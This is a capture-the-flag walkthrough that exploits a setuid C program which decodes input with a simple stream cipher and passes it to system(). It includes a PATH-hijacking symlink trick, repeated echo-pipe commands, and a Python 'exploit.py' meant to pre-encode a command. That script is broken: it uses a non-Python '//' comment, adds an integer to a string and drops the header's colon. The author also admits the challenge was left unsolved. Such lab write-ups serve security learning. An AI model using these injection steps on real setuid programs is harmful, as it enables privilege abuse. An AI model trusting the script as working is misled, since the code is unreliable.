Let's take a look at the source code...

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));
  
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

}
```

So looking through the code, it takes input through a fgets() call at the beginning of the function. The input has to have the header "Content-Length: " at the beginning, otherwise it will fail an if then check and exit the program. Looking through the code, there appears to be a system() call in the process() function which is what we will want to control. There are two calls to the process() function, which probably means there are two ways we can exploit this binary. One thing, I haven't completely solved the challenges. So far I have just been able to run an exploit in the program that calls getflag. I will come back later and look into finishing these challenges. When I looked on a writeup, a lot of other writeups reached the same place I did, yet others that did identical to what I did actually completed the challenges. This may be beacuse of a bug, but we'll see.

#Method 1

The first methodwe have will involve having our input being less than 1024, so that it will execute the 'else' portion of this if then statement.

```
if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
```

Now the first if then statement just checks to see if the size of the input is less than 1024 characters, which shouldn't be a problem. The second if then statements, however is a bit tricky and took me some playing around a compiler to figure out. The fread() function will essentially output the amount of items read successfully by the program, which should be one (since it only uses fgets once and doesn't use it's parameters). The length variable's value is determined by the following code.

```
 if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));
```

The first if then statement essentially runs fgets to accept input, then checks to see if it is null an exits the program if it does. The seoncd if then statement checks to see if the string stored in CL "Content-Length: " is in the inputed data, and exits the program if it isn't. The third line of data essentially sets the value of length equal to the integer value after the CL string. Since the fread() should only output a one, then the decimal value we input into the application should be a one so it will pass the checks. This limits our options, however we can still provide additional input the program on a newline. (Btw we need the -ne flags on the echo command, so it will format the string correctly).

```
$ echo -ne "Content-Length: 1\ng" | /home/flag11/flag11
sh: $'f\360x\214': command not found
```

So the additional input we did give did work, and we can tell that we did call system because of the error, however we run into an issue. We can only pass a single character to the program before we start getting errors. This limits us because we cannot pass a null terminator to the program, so it just tags on random values. In addition to that in the process() function it xors our input. Let's take a look at how exatctly the data flows after the if then statements.

This is where the process function starts, it passes buf and length as the paramteres.
```
process(buf, length);
```

Here we have the actual process function

```
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```

In here this xors out lenght, which holds our input, so that is probably why when we inputtead a "g" we got an "f". However that should remain constant so that wouldn't be a problem. Now what we can do, is we can create a symbolic link to getflag, export it to the global path variable so the program can execute it, and keep on running the program untill the random value it generates is a null byte (thus allowing the command to successfully run.

```
$ ln -s /bin/getflag f
$ export PATH=~:$PATH
```

Now that we have modified the PATH enviormental variable, we should be able to run this command

```
$ echo -ne "Content-Length: 1\ng" | /home/flag11/flag11
```

And once we get a null terminator on the end, we will see this.

```
$ echo -ne "Content-Length: 1\ng" | /home/flag11/flag11
getflag is execution on a non-flag account, this doesn't count
```

And just like that, we almost pwned the challenge.

#Method 2

Now this method is what happens when our input is larger than 1024, and we go down the else tree. Looking through the code of what happens, I see that it runs several more checks and functions such as getrand(), and it uses the mmap() function to reallocate space to hand the larger data when it's passed to process(), however there is nothing here that we should really be concerened about. So, back the process function.

```
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```

Now looking at this code, we might be able to essentially do what we did in a method 1, with passing a single character to it and have that character be linked to an actual executable. However, we don't have the restrictions in place that caused us to go down that route. So we can just pass the command straight to it. The only problem is, before our command reaches the system() call, it goes through a stream cipher (a cipher where the encrypted bytes is used to encrypt the next one). However this is a pretty simple encryption method, and we can just reverse it and build a new algorithm that effectively decrypts that, and run our command through the new algroithm, and feed it to the program. That way the two algorithms will just cancel each other out and our comand can pass to system(). 

Here is the python script that contains the algorithm. Essentially we are just xoring the data.
```
// this is named exploit.py
command = "getflag"
key = 0
encrypted = ""

for char in command:
  encrypted += ord(char) ^ key & 0xff
  key = key - ord(char) & 0xff
print "Content-Length 1024\n" + encrypted + "\x00" * (1024 - len(encrypted))
```

Now to try the script

```
$ python exploit.py | /home/flag11/flag11
blue = 1024,  length = 1024,  pink = 1024
$ getflag is execution on a non-flag account, this doesn't count
```

And just like that we almost pwned the binary. 


